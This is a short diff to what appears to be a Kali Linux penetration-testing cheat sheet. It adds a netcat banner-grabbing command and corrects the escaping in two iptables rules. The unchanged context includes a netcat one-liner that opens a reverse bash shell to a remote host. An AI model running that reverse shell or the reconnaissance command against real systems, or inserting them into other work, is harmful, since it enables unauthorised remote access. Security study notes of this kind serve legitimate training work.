@@ -155,6 +155,10 @@ Kali Linux
 
     -   Create a reverse shell with Ncat using bash on Linux  
         `nc -nv $ip 4444 -e /bin/bash`
+        
+    -   Netcat for Banner Grabbing:
+    
+        `echo "" | nc -nv -w1 <IP Address> <Ports>`
 
 -   Ncat - Netcat for Nmap project which provides more security avoid
     IDS
@@ -210,9 +214,9 @@ Kali Linux
 
     -   Deny traffic to ports except for Local Loopback
 
-        `iptables -A INPUT -p tcp --destination-port 13327 \! -d $ip -j DROP  `
+        `iptables -A INPUT -p tcp --destination-port 13327 ! -d $ip -j DROP  `
     
-        `iptables -A INPUT -p tcp --destination-port 9991 \! -d $ip -j DROP`
+        `iptables -A INPUT -p tcp --destination-port 9991 ! -d $ip -j DROP`
 
     -   Clear ALL IPTables firewall rules
     
